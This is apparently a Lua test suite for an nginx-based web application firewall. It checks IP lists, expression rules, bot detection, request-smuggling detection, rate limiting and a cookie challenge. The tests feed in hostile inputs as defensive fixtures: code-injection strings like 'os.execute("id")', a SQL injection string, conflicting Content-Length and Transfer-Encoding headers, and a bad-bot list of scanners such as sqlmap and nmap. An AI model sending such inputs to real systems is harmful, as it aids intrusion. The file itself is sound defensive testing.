check("iplist miss nil", not iplist.in_list(nil))
check("iplist miss garbage", not iplist.in_list("not-an-ip"))

-- 坏数据必须降级为"不拦截"，而不是打挂站点
iplist._reset()
iplist._set_reader(function() return "GARBAGE" end)
check("iplist bad data no crash", iplist.in_list("1.2.3.4") == false)
iplist._reset()
iplist._set_reader(function() return nil end)
check("iplist missing file no crash", iplist.in_list("1.2.3.4") == false)

-- v6 往返
check("iplist v6 pack", (function()
    local p = iplist.pack_v6("2001:db8::1")
    return p and #p == 16
end)())
check("iplist v6 pack compressed", (function()
    local p = iplist.pack_v6("::1")
    return p and #p == 16
end)())
check("iplist v6 pack reject v4", iplist.pack_v6("1.2.3.4") == nil)
check("iplist v6 pack reject junk", iplist.pack_v6("zz::1") == nil)
iplist._reset()
iplist._set_reader(nil)

-- ==================== expr ====================
local expr = require("waf.expr")
local dims = {ip = "1.2.3.4", path = "/admin/login", method = "POST", ua = "curl/8.0", referer = "", cookie = ""}
check("expr ip cidr", expr.eval('ip in "1.2.3.0/24"', dims) == true)
check("expr ip no", expr.eval('ip in "9.9.9.0/24"', dims) == false)
check("expr path matches", expr.eval('path matches "^/admin"', dims) == true)
check("expr and", expr.eval('ip in "1.2.3.0/24" and path matches "^/admin"', dims) == true)
check("expr and false", expr.eval('ip in "1.2.3.0/24" and method in ["GET"]', dims) == false)
check("expr or", expr.eval('method in ["GET"] or method in ["POST"]', dims) == true)
check("expr or chain", expr.eval('method in ["GET"] or method in ["PUT"] or method in ["POST"]', dims) == true)
check("expr contains", expr.eval('ua contains "curl"', dims) == true)
check("expr false-positive ip path", expr.eval('ip in "1.2.3.4" and path eq "/admin/login"', dims) == true)
check("expr eq", expr.eval('method eq "POST"', dims) == true)
check("expr cookie", expr.eval('cookie contains "token"', {cookie = "token=abc"}) == true)
check("expr reject bad char", expr.eval('os.execute("id")', dims) == false)
check("expr reject load", expr.eval('loadstring("os.execute(1)")', dims) == false)
check("expr reject empty", expr.eval("", dims) == false)
check("expr reject long", expr.eval(string.rep("a", 2000), dims) == false)
check("expr reject unclosed str", expr.eval('ip in "1.2.3.0/24', dims) == false)
check("expr reject trailing", expr.eval('ip in "1.2.3.0/24" garbage', dims) == false)
check("expr reject unknown var", expr.eval('foo in "bar"', dims) == false)
check("expr reject unknown op", expr.eval('ip frobnicate "x"', dims) == false)
check("expr reject table of garbage", expr.eval('ip in [1,2,3]', dims) == false)

-- ==================== bot ====================
local bot = require("waf.bot")
check("bot google", bot.classify("Mozilla/5.0 (compatible; Googlebot/2.1)") == "good")
check("bot bing", bot.classify("Mozilla/5.0 (compatible; bingbot/2.0)") == "good")
check("bot baidu", bot.classify("Baiduspider+(+http://www.baidu.com)") == "good")
check("bot sogou", bot.classify("Sogou web spider/4.0") == "good")
check("bot sqlmap", bot.classify("sqlmap/1.5.2#stable") == "bad")
check("bot nikto", bot.classify("Nikto/2.1.6") == "bad")
check("bot nmap", bot.classify("Nmap Scripting Engine") == "bad")
check("bot nuclei", bot.classify("Nuclei - Open-source project (github.com/projectdiscovery/nuclei)") == "bad")
check("bot go-http-client", bot.classify("Go-http-client/1.1") == "bad")
check("bot python-requests", bot.classify("python-requests/2.28.0") == "bad")
check("bot normal ua", bot.classify("Mozilla/5.0 (Macintosh) Chrome/120.0") == nil)
check("bot empty ua", bot.classify("") == nil)
reset_state()
T.vars.http_user_agent = "sqlmap/1.5.2"
check("bot check blocks", bot.check({enabled = true, allowGoodBots = true, blockBadBots = true}) == "bad")
check("bot check blockBad off", bot.check({enabled = true, allowGoodBots = true, blockBadBots = false}) == nil)
T.vars.http_user_agent = "Googlebot/2.1"
check("bot check good", bot.check({enabled = true, allowGoodBots = true, blockBadBots = true}) == "good")
check("bot check allowGood off", bot.check({enabled = true, allowGoodBots = false, blockBadBots = true}) == nil)
check("bot check disabled", bot.check({enabled = false}) == nil)

-- ==================== smug ====================
local smug = require("waf.smug")
local function with_headers(h, fn)
    T.headers = h
    local ok, res = pcall(fn)
    T.headers = {}
    if not ok then error(res) end
    return res
end
check("smug clean", with_headers({["host"] = "a.com"}, function() return smug.detect() == nil end))
check("smug post clean", with_headers({["Content-Length"] = "42"}, function() return smug.detect() == nil end))
check("smug cl+te", with_headers({["Content-Length"] = "10", ["Transfer-Encoding"] = "chunked"}, function() return smug.detect() ~= nil end))
check("smug te+cl zero", with_headers({["Content-Length"] = "0", ["Transfer-Encoding"] = "chunked"}, function() return smug.detect() == nil end))
check("smug dup conflicting cl", with_headers({["Content-Length"] = {"5", "6"}}, function() return smug.detect() ~= nil end))
-- 重复 CL（无论值是否相同）在真实 nginx 中合并为 table，按畸形头拦截（防御性拒绝，符合反走私策略）
check("smug dup same cl", with_headers({["Content-Length"] = {"5", "5"}}, function() return smug.detect() ~= nil end))
check("smug malformed cl", with_headers({["Content-Length"] = "5, 6"}, function() return smug.detect() ~= nil end))
check("smug signed cl", with_headers({["Content-Length"] = "+5"}, function() return smug.detect() ~= nil end))
check("smug te gzip", with_headers({["Transfer-Encoding"] = "gzip"}, function() return smug.detect() ~= nil end))
check("smug te chunked ok", with_headers({["Transfer-Encoding"] = "chunked"}, function() return smug.detect() == nil end))
check("smug cl zero ok", with_headers({["Content-Length"] = "0"}, function() return smug.detect() == nil end))

-- ==================== probe ====================
local probe = require("waf.probe")
reset_state()
T.vars.remote_addr = "9.9.9.9"
local hit = nil
for i = 1, 8 do
    T.vars.uri = "/path" .. i
    hit = probe.check({enabled = true, maxURIs = 5, window = 60, maxRPS = 100})
end
check("probe uri diversity", hit ~= nil and hit:find("distinct URIs") ~= nil)
-- 相同 URI 高频：不触发多样性，触发速率
reset_state()
T.vars.remote_addr = "9.9.9.9"
T.vars.uri = "/api"
hit = nil
for i = 1, 12 do
    hit = probe.check({enabled = true, maxURIs = 50, window = 60, maxRPS = 10})
end
check("probe rate", hit ~= nil and hit:find("requests in") ~= nil)
-- 正常浏览：5 个 URI 低速率
reset_state()
T.vars.remote_addr = "9.9.9.9"
hit = nil
for i = 1, 5 do
    T.vars.uri = "/page" .. i
    hit = probe.check({enabled = true, maxURIs = 60, window = 60, maxRPS = 120})
end
check("probe clean", hit == nil)
check("probe disabled", probe.check({enabled = false}) == nil)
-- 窗口轮转：模拟时间跨过一个窗口，记录应重新累计
reset_state()
T.vars.remote_addr = "9.9.9.9"
T.vars.uri = "/p"
probe.check({enabled = true, maxURIs = 2, window = 60, maxRPS = 100})
probe.check({enabled = true, maxURIs = 2, window = 60, maxRPS = 100})
T.now = T.now + 61
hit = probe.check({enabled = true, maxURIs = 2, window = 60, maxRPS = 100})
check("probe window reset", hit == nil)

-- ==================== cc ====================
local cc = require("waf.cc")
reset_state()
T.vars.remote_addr = "1.2.3.4"
local verdict = nil
for i = 1, 5 do verdict = cc.check({limit = 5, window = 60, action = "deny"}) end
check("cc under limit", verdict == nil)
check("cc over limit deny", cc.check({limit = 5, window = 60, action = "deny"}) == "deny")
check("cc action challenge", cc.check({limit = 5, window = 60, action = "challenge"}) == "challenge")
check("cc action log", cc.check({limit = 5, window = 60, action = "log"}) == "log")
-- byUri 维度互不影响
reset_state()
T.vars.remote_addr = "1.2.3.4"
for i = 1, 3 do T.vars.uri = "/a" cc.check({limit = 3, window = 60, action = "deny", byUri = true}) end
T.vars.uri = "/b"
check("cc byuri isolated", cc.check({limit = 3, window = 60, action = "deny", byUri = true}) == nil)
T.vars.uri = "/a"
check("cc byuri hit", cc.check({limit = 3, window = 60, action = "deny", byUri = true}) == "deny")
-- 窗口轮转
reset_state()
T.vars.remote_addr = "1.2.3.4"
for i = 1, 6 do cc.check({limit = 5, window = 60, action = "deny"}) end
T.now = T.now + 61
check("cc window reset", cc.check({limit = 5, window = 60, action = "deny"}) == nil)
-- 无效配置
check("cc no conf", cc.check(nil) == nil)
check("cc zero limit", cc.check({limit = 0}) == nil)
check("cc disabled by limit", cc.check({limit = -1}) == nil)

-- ==================== challenge ====================
local challenge = require("waf.challenge")
reset_state()
T.vars.remote_addr = "1.2.3.4"
T.vars.http_user_agent = "browser"
T.vars.waf_challenge_secret = "test-secret"
local ok_exit = pcall(function() challenge.respond() end)
check("challenge respond exits 200", ok_exit == false and T.exited == 200)
local cookie = T.resp_headers and tostring(T.resp_headers["Set-Cookie"]):match("waf_challenge=([^;]+)")
check("challenge sets signed cookie", cookie and cookie:match("^%d+%.[%w_%-]+$") ~= nil)
check("challenge cookie is hardened", tostring(T.resp_headers["Set-Cookie"]):find("HttpOnly", 1, true) and tostring(T.resp_headers["Set-Cookie"]):find("SameSite=Lax", 1, true))
T.vars.cookie_waf_challenge = cookie
check("challenge passed", challenge.passed() == true)
T.vars.cookie_waf_challenge = cookie:gsub(".$", "x")
check("challenge rejects forged cookie", challenge.passed() == false)
T.vars.cookie_waf_challenge = tostring(math.floor(T.now) - 1) .. ".forged"
check("challenge rejects expired cookie", challenge.passed() == false)

-- ==================== rules 名单引擎（rules.json 集成） ====================
local RULES_FILE = "/tmp/waf_test_rules.json"
local function write_rules(data)
    local f = assert(io.open(RULES_FILE, "w"))
    f:write(json.encode(data))
    f:close()
end

local function rules_scenario(name, rules_data, setup, expect)
    reset_state()
    reset_modules()
    write_rules(rules_data)
    T.vars.waf_rules_path = RULES_FILE
    T.vars.waf_site_id = "1"
    T.now = T.now + 10 -- 跳过缓存窗口
    setup()
    local rules = require("waf.rules")
    local res = rules.check()
    check(name, expect(res))
end

local base_dims = function()
    T.vars.remote_addr = "1.2.3.4"
    T.vars.uri = "/index"
    T.vars.request_uri = "/index"
    T.headers["User-Agent"] = "Mozilla/5.0 Chrome"
end

-- 白名单放行
rules_scenario("rules allow ip", {global = {rules = {
    {id = 1, name = "allow-me", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "allow", enabled = true},
}}}, base_dims, function(res) return res and res.action == "allow" end)

-- 黑名单拦截
rules_scenario("rules deny ip", {global = {rules = {
    {id = 1, name = "deny-me", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true},
}}}, base_dims, function(res) return res and res.action == "deny" end)

-- 白名单优先于黑名单（同层）
rules_scenario("rules allow beats deny", {global = {rules = {
    {id = 1, name = "deny", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true},
    {id = 2, name = "allow", priority = 20, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "allow", enabled = true},
}}}, base_dims, function(res) return res and res.action == "allow" end)

-- Go 侧预编译的 exact 规则走映射快路径，且与慢路径保持 allow 优先语义。
rules_scenario("rules compiled exact path", {global = {
    rules = {},
    compiled = {path = {["/index"] = {id = 10, name = "compiled-path", priority = 10, action = "deny"}}},
}}, base_dims, function(res) return res and res.action == "deny" and res.rule.name == "compiled-path" end)

rules_scenario("rules residual allow beats compiled deny", {global = {
    rules = {{id = 11, name = "slow-allow", priority = 99, match_type = "path", match_value = "/index", match_op = "exact", action = "allow", enabled = true}},
    compiled = {path = {["/index"] = {id = 12, name = "fast-deny", priority = 1, action = "deny"}}},
}}, base_dims, function(res) return res and res.action == "allow" and res.rule.name == "slow-allow" end)

-- 站点级覆盖全局：站点 deny 应胜过全局 allow
rules_scenario("rules site beats global", {
    global = {rules = {{id = 1, name = "g-allow", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "allow", enabled = true}}},
    sites = {["1"] = {rules = {{id = 2, name = "s-deny", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true}}}},
}, base_dims, function(res) return res and res.action == "deny" and res.rule.name == "s-deny" end)

-- 站点 allow 胜过全局 deny
rules_scenario("rules site allow beats global deny", {
    global = {rules = {{id = 1, name = "g-deny", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true}}},
    sites = {["1"] = {rules = {{id = 2, name = "s-allow", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "allow", enabled = true}}}},
}, base_dims, function(res) return res and res.action == "allow" end)

-- 其他站点规则不影响本站
rules_scenario("rules other site ignored", {
    global = {rules = {}},
    sites = {["2"] = {rules = {{id = 1, name = "s2-deny", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true}}}},
}, base_dims, function(res) return res == nil end)

-- disabled 规则不生效
rules_scenario("rules disabled skipped", {global = {rules = {
    {id = 1, name = "off", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = false},
}}}, base_dims, function(res) return res == nil end)

-- TTL 过期规则不生效（expires_at 为过去时间，RFC3339）
rules_scenario("rules expired skipped", {global = {rules = {
    {id = 1, name = "expired", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true, expires_at = "2020-01-01T00:00:00Z"},
}}}, base_dims, function(res) return res == nil end)

-- TTL 未过期规则生效
rules_scenario("rules unexpired applies", {global = {rules = {
    {id = 1, name = "fresh", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true, expires_at = "2999-01-01T00:00:00Z"},
}}}, base_dims, function(res) return res and res.action == "deny" end)

-- RFC3339 offset must be honored independently of the host timezone.
local future_offset = os.date("!%Y-%m-%dT%H:%M:%S", T.now + 60 - 5 * 3600) .. "-05:00"
rules_scenario("rules timezone offset applies", {global = {rules = {
    {id = 1, name = "future-offset", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true, expires_at = future_offset},
}}}, base_dims, function(res) return res and res.action == "deny" end)

rules_scenario("rules site disabled", {global = {rules = {}}, sites = {['1'] = {enabled = false, rules = {}}}}, base_dims, function()
    return require("waf.rules").site_enabled() == false
end)

-- match_op 变体：path contains / prefix / suffix / wildcard / regex
local path_dims = function()
    T.vars.remote_addr = "9.9.9.9"
    T.vars.uri = "/admin/users/list"
    T.vars.request_uri = "/admin/users/list"
end
rules_scenario("rules path contains", {global = {rules = {
    {id = 1, name = "c", priority = 10, match_type = "path", match_value = "/admin", match_op = "contains", action = "deny", enabled = true},
}}}, path_dims, function(res) return res ~= nil end)
rules_scenario("rules path prefix", {global = {rules = {
    {id = 1, name = "p", priority = 10, match_type = "path", match_value = "/admin", match_op = "prefix", action = "deny", enabled = true},
}}}, path_dims, function(res) return res ~= nil end)
rules_scenario("rules path prefix no", {global = {rules = {
    {id = 1, name = "p", priority = 10, match_type = "path", match_value = "/users", match_op = "prefix", action = "deny", enabled = true},
}}}, path_dims, function(res) return res == nil end)
rules_scenario("rules path suffix", {global = {rules = {
    {id = 1, name = "s", priority = 10, match_type = "path", match_value = "list", match_op = "suffix", action = "deny", enabled = true},
}}}, path_dims, function(res) return res ~= nil end)
rules_scenario("rules path wildcard", {global = {rules = {
    {id = 1, name = "w", priority = 10, match_type = "path", match_value = "/admin/*/list", match_op = "wildcard", action = "deny", enabled = true},
}}}, path_dims, function(res) return res ~= nil end)
rules_scenario("rules path wildcard no", {global = {rules = {
    {id = 1, name = "w", priority = 10, match_type = "path", match_value = "/admin/*/edit", match_op = "wildcard", action = "deny", enabled = true},
}}}, path_dims, function(res) return res == nil end)
rules_scenario("rules path regex", {global = {rules = {
    {id = 1, name = "r", priority = 10, match_type = "path", match_value = "^/admin/%a+", match_op = "regex", action = "deny", enabled = true},
}}}, path_dims, function(res) return res ~= nil end)
rules_scenario("rules path invalid regex", {global = {rules = {
    {id = 1, name = "r", priority = 10, match_type = "path", match_value = "(unclosed", match_op = "regex", action = "deny", enabled = true},
}}}, path_dims, function(res) return res == nil end)

-- UA / method / header / cookie 维度
rules_scenario("rules ua deny", {global = {rules = {
    {id = 1, name = "ua", priority = 10, match_type = "ua", match_value = "curl", match_op = "contains", action = "deny", enabled = true},
}}}, function()
    base_dims()
    T.headers["User-Agent"] = "curl/8.0"
end, function(res) return res ~= nil end)
rules_scenario("rules method deny", {global = {rules = {
    {id = 1, name = "m", priority = 10, match_type = "method", match_value = "PUT", match_op = "exact", action = "deny", enabled = true},
}}}, function()
    base_dims()
    T.method = "PUT"
end, function(res) return res ~= nil end)
rules_scenario("rules header deny", {global = {rules = {
    {id = 1, name = "h", priority = 10, match_type = "header", match_value = "X-Token:bad", match_op = "exact", action = "deny", enabled = true},
}}}, function()
    base_dims()
    T.headers["x-token"] = "bad" -- 真实 ngx.req.get_headers() 返回小写键
end, function(res) return res ~= nil end)
rules_scenario("rules cookie deny", {global = {rules = {
    {id = 1, name = "ck", priority = 10, match_type = "cookie", match_value = "banned=1", match_op = "contains", action = "deny", enabled = true},
}}}, function()
    base_dims()
    T.vars.http_cookie = "banned=1"
end, function(res) return res ~= nil end)

-- cidr 匹配
rules_scenario("rules cidr deny", {global = {rules = {
    {id = 1, name = "net", priority = 10, match_type = "cidr", match_value = "1.2.3.0/24", match_op = "exact", action = "deny", enabled = true},
}}}, base_dims, function(res) return res ~= nil end)
rules_scenario("rules cidr no", {global = {rules = {
    {id = 1, name = "net", priority = 10, match_type = "cidr", match_value = "5.6.7.0/24", match_op = "exact", action = "deny", enabled = true},
}}}, base_dims, function(res) return res == nil end)

-- expr 规则（黑名单表达式）
rules_scenario("rules expr deny", {global = {rules = {
    {id = 1, name = "e", priority = 10, match_type = "expr", match_value = 'ip in "1.2.3.0/24" and method in ["POST"]', match_op = "exact", action = "deny", enabled = true},
}}}, function()
    base_dims()
    T.method = "POST"
end, function(res) return res ~= nil end)
rules_scenario("rules expr no match", {global = {rules = {
    {id = 1, name = "e", priority = 10, match_type = "expr", match_value = 'ip in "1.2.3.0/24" and method in ["POST"]', match_op = "exact", action = "deny", enabled = true},
}}}, base_dims, function(res) return res == nil end)

-- challenge / log 动作
rules_scenario("rules challenge action", {global = {rules = {
    {id = 1, name = "ch", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "challenge", enabled = true},
}}}, base_dims, function(res) return res and res.action == "challenge" end)
rules_scenario("rules log action", {global = {rules = {
    {id = 1, name = "lg", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "log", enabled = true},
}}}, base_dims, function(res) return res and res.action == "log" end)

-- 优先级：priority 小的 deny 先命中（deny 类取首个）
rules_scenario("rules priority order", {global = {rules = {
    {id = 1, name = "p100", priority = 100, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "log", enabled = true},
    {id = 2, name = "p10", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true},
}}}, base_dims, function(res) return res and res.rule.name == "p10" end)

-- ==================== waflog ====================
rules_scenario("waflog emit writes json line", {global = {rules = {}}}, function()
    T.vars.waf_log_path = "/tmp/waf_test_events.log"
    os.remove("/tmp/waf_test_events.log")
end, function()
    local waflog = require("waf.waflog")
    local ok = waflog.emit({websiteId = 1, attackType = "sqli", action = "deny", ip = "1.2.3.4"})
    if not ok then return false end
    local f = io.open("/tmp/waf_test_events.log", "r")
    if not f then return false end
    local line = f:read("*l")
    f:close()
    local evt = json.decode(line)
    return evt and evt.attackType == "sqli" and evt.ip == "1.2.3.4" and evt.time ~= nil
end)

-- ==================== access 集成 ====================
local function access_scenario(name, rules_data, setup, expect)
    reset_state()
    reset_modules()
    write_rules(rules_data)
    T.vars.waf_rules_path = RULES_FILE
    T.vars.waf_site_id = "1"
    T.vars.waf_log_path = "/tmp/waf_test_events.log"
    os.remove("/tmp/waf_test_events.log")
    T.now = T.now + 10
    setup()
    local access_main = package.loaded["waf.access"]
    -- access.lua 加载时已执行一次主流程；这里再手动调用一次观察结果
    run(function() access_main() end)
    check(name, expect())
end

-- 语义检测拦截：query 带 SQLi
access_scenario("access denies sqli", {global = {rules = {}}}, function()
    T.vars.remote_addr = "1.2.3.4"
    T.vars.uri = "/login"
    T.vars.request_uri = "/login?id=1' OR '1'='1"
    T.uri_args = {id = "1' OR '1'='1"}
end, function()
    return ngx.status == 403 and T.exited == 403
end)

-- 白名单跳过检测：同请求被 allow 放行
access_scenario("access whitelist skips detect", {global = {rules = {
    {id = 1, name = "allow", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "allow", enabled = true},
}}}, function()
    T.vars.remote_addr = "1.2.3.4"
    T.vars.uri = "/login"
    T.vars.request_uri = "/login?id=' OR '1'='1"
    T.uri_args = {id = "' OR '1'='1"}
end, function()
    return T.exited == nil and ngx.status == nil
end)

-- 黑名单 deny 拦截并写日志
access_scenario("access blacklist denies and logs", {global = {rules = {
    {id = 1, name = "deny", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true},
}}}, function()
    T.vars.remote_addr = "1.2.3.4"
    T.vars.uri = "/"
    T.vars.request_uri = "/"
end, function()
    if not (ngx.status == 403) then return false end
    local f = io.open("/tmp/waf_test_events.log", "r")
    if not f then return false end
    local line = f:read("*l")
    f:close()
    local evt = json.decode(line)
    return evt and evt.action == "deny" and evt.layer == "rules" and evt.ruleName == "deny"
end)

access_scenario("access compiled blacklist denies", {global = {
    rules = {},
    compiled = {path = {["/compiled-only"] = {id = 31, name = "compiled-deny", priority = 10, action = "deny"}}},
}}, function()
    T.vars.uri = "/compiled-only"
    T.vars.request_uri = "/compiled-only"
end, function()
    return ngx.status == 403 and T.exited == 403
end)

-- 正常请求放行且无事件
access_scenario("access clean pass", {global = {rules = {}}}, function()
    T.vars.remote_addr = "1.2.3.4"
    T.vars.uri = "/"
    T.vars.request_uri = "/"
    T.uri_args = {}
end, function()
    local f = io.open("/tmp/waf_test_events.log", "r")
    local has = f ~= nil
    if f then f:close() end
    return T.exited == nil and not has
end)

-- CC 拦截：同 IP 超限速
access_scenario("access cc denies", {global = {rules = {}}, sites = {["1"] = {cc = {limit = 3, window = 60, action = "deny"}}}}, function()
    T.vars.remote_addr = "1.2.3.4"
    T.vars.uri = "/api"
    T.vars.request_uri = "/api"
end, function()
    -- 单次请求不超限（access 只跑一次）
    return T.status ~= 403
end)

print(string.format("\n%d passed, %d failed", pass, fail))
os.remove(RULES_FILE)
if fail > 0 then os.exit(1) end
